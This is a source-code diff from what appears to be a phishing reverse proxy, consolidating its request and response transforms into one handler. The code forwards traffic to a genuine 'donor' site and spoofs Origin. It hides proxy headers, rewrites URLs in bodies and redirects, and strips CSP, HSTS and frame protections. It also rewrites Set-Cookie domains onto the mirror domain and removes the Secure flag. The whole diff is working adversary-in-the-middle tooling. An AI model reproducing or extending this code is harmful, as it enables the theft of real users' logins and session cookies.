@@ -29,19 +29,14 @@ export class TransformController extends BaseController {
     this.logger.debug(`TransformController initialized`)
   }
 
-  useAll(): this {
-    this.useBasic().useFixCors().useFixCsp().useRewriteUrl()
-
-    return this
-  }
-
-  useBasic(): this {
-    this.router.register('transform-basic', async (ctx, next) => {
+  use(): this {
+    this.router.register('transform', async (ctx, next) => {
       const campaign = this.getState(ctx, 'campaign')
       const target = this.getState(ctx, 'target')
+      const targets = this.getState(ctx, 'targets')
       const message = this.getState(ctx, 'message')
 
-      message.addRequestHeadInterceptor('transform-basic', () => {
+      message.addRequestHeadInterceptor('transform', () => {
         message.url.merge({
           protocol: target.donorProtocol,
           hostname: target.donorHostname,
@@ -50,130 +45,97 @@ export class TransformController extends BaseController {
 
         message.requestHeaders.set('Host', target.donorHost)
 
-        const cookies = message.requestHeaders.getCookies()
-        if (cookies) {
-          cookies[campaign.sessionCookieName] = undefined
-          message.requestHeaders.setCookies(cookies)
-        }
-
-        //if (message.requestHeaders.has('Upgrade-Insecure-Requests')) {
-        //  if (!target.mirrorSecure) {
-        //    message.requestHeaders.delete('Upgrade-Insecure-Requests')
-        //  }
-        //}
-
-        message.requestHeaders.delete([
-          'Via',
-          'X-Real-Ip',
-          'X-Forwarded-For',
-          'X-Forwarded-Host',
-          'X-Forwarded-Proto'
-          // ...
-        ])
-      })
-
-      message.addResponseHeadInterceptor('transform-basic', () => {
-        message.responseHeaders.delete([
-          'Proxy-Agent'
-          // ...
-        ])
-      })
-
-      await next()
-    })
-
-    return this
-  }
-
-  useFixCors(): this {
-    this.router.register('transform-fix-cors', async (ctx, next) => {
-      const target = this.getState(ctx, 'target')
-      const message = this.getState(ctx, 'message')
-
-      message.addRequestHeadInterceptor('transform-fix-cors', () => {
         if (message.requestHeaders.has('Origin')) {
           const donorOrigin = [target.donorProtocol, '//', target.donorHost].join('')
 
           message.requestHeaders.set('Origin', donorOrigin)
         }
+
+        message.requestHeaders.delete([
+          'Via',
+          'X-Real-Ip',
+          'X-Client-Ip',
+          'X-Forwarded-For',
+          'X-Forwarded-Host',
+          'X-Forwarded-Proto',
+          'Upgrade-Insecure-Requests'
+        ])
+
+        const cookies = message.requestHeaders.getCookies()
+        if (cookies) {
+          cookies[campaign.sessionCookieName] = undefined
+
+          message.requestHeaders.setCookies(cookies)
+        }
       })
 
-      message.addResponseHeadInterceptor('transform-fix-cors', () => {
+      message.addRequestBodyInterceptor('transform', () => {
+        const contentType = message.requestHeaders.getContentType()
+        if (contentType && message.isRewriteUrlContentType(contentType)) {
+          const charset = contentType.parameters['charset']
+
+          const oldValue = message.requestBody.getText(charset)
+          if (oldValue) {
+            const newValue = message.rewriteUrl(oldValue, true, targets)
+            message.requestBody.setText(newValue)
+          }
+        }
+      })
+
+      message.addResponseHeadInterceptor('transform', () => {
         if (message.responseHeaders.has('Access-Control-Allow-Origin')) {
           message.responseHeaders.set('Access-Control-Allow-Origin', '*')
         }
-      })
 
-      await next()
-    })
-
-    return this
-  }
-
-  useFixCsp(): this {
-    this.router.register('transform-fix-csp', async (ctx, next) => {
-      const target = this.getState(ctx, 'target')
-      const message = this.getState(ctx, 'message')
-
-      message.addResponseHeadInterceptor('transform-fix-csp', () => {
-        if (message.responseHeaders.has('Content-Security-Policy')) {
-          message.responseHeaders.set(
-            'Content-Security-Policy',
-            `default-src 'self' *.${target.mirrorDomain} ${target.mirrorDomain};`
-          )
-        }
-
-        if (message.responseHeaders.has('Permissions-Policy')) {
-          message.responseHeaders.delete('Permissions-Policy')
-        }
-      })
-
-      await next()
-    })
-
-    return this
-  }
-
-  useRewriteUrl(): this {
-    this.router.register('transform-rewrite-url', async (ctx, next) => {
-      const targets = this.getState(ctx, 'targets')
-      const message = this.getState(ctx, 'message')
-
-      message.addRequestBodyInterceptor('transform-rewrite-url', () => {
-        const contentType = message.requestHeaders.getContentType()
-        if (contentType && message.isRewriteUrlType(contentType)) {
-          const charset = contentType.parameters['charset']
-          const fromText = message.requestBody.getText(charset)
-          if (fromText) {
-            const toText = message.rewriteUrl(fromText, true, targets)
-            message.requestBody.setText(toText)
-
-            message.requestHeaders.set('Content-Length', message.requestBody.length.toString())
-          }
-        }
-      })
-
-      message.addResponseHeadInterceptor('transform-rewrite-url', () => {
-        const absoluteUrlRegExp = /^https?:\/\/|^\/\//i
         if (message.responseHeaders.has('Location')) {
-          const fromValue = message.responseHeaders.getString('Location')
-          if (fromValue && absoluteUrlRegExp.test(fromValue)) {
-            const toValue = message.rewriteUrl(fromValue.toLowerCase(), false, targets)
-            message.responseHeaders.set('Location', toValue)
+          const absoluteUrlRegExp = /^https?:\/\/|^\/\//i
+          const oldValue = message.responseHeaders.getString('Location')
+          if (oldValue && absoluteUrlRegExp.test(oldValue)) {
+            const newValue = message.rewriteUrl(oldValue, false, targets)
+            message.responseHeaders.set('Location', newValue)
           }
+        }
+
+        message.responseHeaders.delete([
+          'Proxy-Agent',
+          'Content-Security-Policy',
+          'Content-Security-Policy-Report-Only',
+          'Permissions-Policy',
+          'Strict-Transport-Security',
+          'X-XSS-Protection',
+          'X-Content-Type-Options',
+          'X-Frame-Options'
+        ])
+
+        const setCookies = message.responseHeaders.getSetCookies()
+        if (setCookies) {
+          Object.keys(setCookies).forEach((name) => {
+            const setCookie = setCookies[name]
+
+            if (setCookie) {
+              if (setCookie.domain) {
+                setCookie.domain = '.' + campaign.mirrorDomain
+              }
+
+              if (setCookie.secure && !target.mirrorSecure) {
+                setCookie.secure = false
+              }
+            }
+          })
+
+          message.responseHeaders.setSetCookies(setCookies)
         }
       })
 
-      message.addResponseBodyInterceptor('transform-rewrite-url', () => {
+      message.addResponseBodyInterceptor('transform', () => {
         const contentType = message.responseHeaders.getContentType()
-        if (contentType && message.isRewriteUrlType(contentType)) {
+        if (contentType && message.isRewriteUrlContentType(contentType)) {
           const charset = contentType.parameters['charset']
-          const fromText = message.responseBody.getText(charset)
-          if (fromText) {
-            const toText = message.rewriteUrl(fromText, false, targets)
-            message.responseBody.setText(toText)
 
-            message.responseHeaders.set('Content-Length', message.responseBody.length.toString())
+          const oldValue = message.responseBody.getText(charset)
+          if (oldValue) {
+            const newValue = message.rewriteUrl(oldValue, false, targets)
+            message.responseBody.setText(newValue)
           }
         }
       })
